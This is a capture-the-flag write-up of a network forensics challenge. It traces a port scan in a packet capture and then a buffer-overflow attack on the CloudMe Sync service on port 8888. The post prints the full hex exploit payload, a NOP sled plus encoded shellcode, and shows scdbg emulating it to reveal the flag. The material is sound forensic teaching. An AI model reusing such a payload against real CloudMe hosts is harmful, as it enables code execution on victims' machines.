---
title: 'FwordCTF 2021: BF'
date: 2021-08-29T04:00:00+00:00
author: Kris
layout: post
image: /images/2021/fword/bftitle.png
categories:
  - Write-Ups
  - Network Forensics
---
Good CTF this one that maybe I should have spent more time on but I was distracted with Wormcon and YauzaCTF on at the same time and building a SIFT box for disk forensics which turned out to be a huge time sink. Anyway on to the writeup!

#### <a name="bf"></a>BF - Forensics - 997 Points

This challenge reads:

```
Is forensics about tools? Prove it.

It seems forensics is not about tools : ). Here is a scenario to make things easier.

An internal attacker was able to gain access to the central server. Your mission is to understand what happened under the hood?

P.S. It is not a CTF challenge where you convert hex to string xD. Think logically.

(7 solves)
```

With the challenge we get this file:

* `bf.pcapng (47mb)`

This is network packet capture and its kinda a big file to just scroll through in Wireshark. In these situations I like to visualize as much about the various source / destination addresses as possible. I use the free version of [Network Miner](https://www.netresec.com/?page=NetworkMiner) to do it. The free version wont load a `PCAPNG` file so I first open it in Wireshark and then save it as a plain old stype `PCAP` file.

This is what I see when I load the PCAP version into Network Miner:

![network miner](/images/2021/fword/bf1.PNG)

The things that stick immediately out to me as interesting are:

- The IPs in the `192.168.196.0/24` subnet as these are on the local network.
- The `cloudme.com` stuff. I don't know what that is yet but I remember it standing out as different for some reason. We come back to it later.

I take a look for the Linux machine traffic first via Wireshark. Now I know what I'm looking for I can filter the traffic in Wireshark more easily. I use `ip.addr == 192.168.196.128` filter to look only at the Linux machine traffic. This is what I see:

![Linux machine traffic](/images/2021/fword/bf2.PNG)

To me this immediately looks like a port scan. This is categorised quickly because I see a lot of `SYN` packets on many destination ports and not much return except `RST` packets. From this we can surmise that the Linux machine may be hostile towards the `192.168.196.133` host. 

We can also determine that `192.168.196.133` was listening on a few open ports during this port scan. They were:

- `http - 80/tcp`
- `smb - 135/tcp, 139/tcp, 445/tcp`
- `unknown server - 8888/tcp`

Following the port scan the Linux machine followed up with only one full connection, a small burst of traffic to that unknown service on port `8888/tcp`:

![Port 8888 traffic](/images/2021/fword/bf3.PNG)

Googling for the port number I run into this blurb on the first Google [result](https://www.speedguide.net/port.php?port=8888):

> An issue was discovered in CloudMe 1.11.0. An unauthenticated local attacker that can connect to the "CloudMe Sync" client application listening on 127.0.0.1 port 8888 can send a malicious payload causing a buffer overflow condition. This will result in code execution, as demonstrated by a TCP reverse shell, or a crash. NOTE: this vulnerability exists because of an incomplete fix for CVE-2018-6892.
> References: [CVE-2018-7886], [EDB-44470]

This clicks in my mind as I remember there was traffic between one of the machines on the network and `cloudme.com`. I still dont really know what `cloudme` is but maybe this traffic is suspicious. Lets look at the payload in Wireshark:

![Buffer overflow](/images/2021/fword/bf4.PNG)

This looks a lot like a `NOP` sled to me given the x86 opcode for `NOP` is `0x90`. The question is, how to interpret what happened here as if this is shellcode, it may be encoded in almost any encoding mechanism. 

In my research on this problem, this is where I stumbled into `scdbg` [Shellcode debugger](http://sandsprite.com/blogs/index.php?uid=7&pid=152). This tool can take your binary shellcode and emulate it using libemu. Let's give it a try?

Firstly I copy / paste the hex values of the payload from Wireshark which gives me this:

```
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
9090909090909090909090909090909090909090909090909090909090909090909090909090909090
909090909090909090909090909090909090909090909090909090b542a86890909090909090909090
9090909090909090909090909090909090909090bb58eb6c6dd9ced97424f45a33c9b14283eafc315a
0f035a570999918f4f626a4f30ea8f7e7088c4d040da89dc2b8e395759074dd0d47160e14541e36194
96c35857eb029d8a065676c0b547f39c05e34f300e1007333f871c6a9f29f1069631162260c9ecd873
1b3d20df62f2d321a2340c54da47b16f193a6de5ba9ce65d671d2a3bec11874faa351683c041932207
c0e7008389bc2992771255c4d8cbf38ef4188ecc92df1c6bd0e01e7444892fff0bceaf2a6820fa77d8
a9a3ed59b453d89dc1d7e95d36c79b58724f7710eb3a77870c6f144a97bebeec329f6f6f9dfd0a0cb5
6ef594321e877cfeb421076605dcc408501149e1c560b867caf69d4348c7549bd310a6d3da6b99277b
a3163adcff698b9fdfb7cb394ca66ce8f85007d6004343434343434343434343434343434343434343
4343434343434343434343434343434343434343434343434343434343434343434343434343434343
43434343434343434343434343
```

Next I dump it into a file called `sc.hex` and use `unhex` to get the binary version:

```shell
$ cat sc.hex | unhex > sc.bin
$ file sc.bin
sc.bin: data
```

Then I copy it to my Windows machine and in a command prompt window run the `scdbg.exe`:

```shell
PS C:\scdbg> .\scdbg.exe -f sc.bin
Loaded 5a8 bytes from file sc.bin
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4014f2  WinExec(cmd.exe /c "echo FwordCTF{f0r3n51c4_15n0t_4b0u7_70015_4f73r_411} > flag.txt")
4014fe  GetVersion()
401511  ExitProcess(0)

Stepcount 555154
```

And wow there's the flag. Encoded in some Windows shellcode thrown at the CloudMe service running on a Windows machine. Fun challenge!



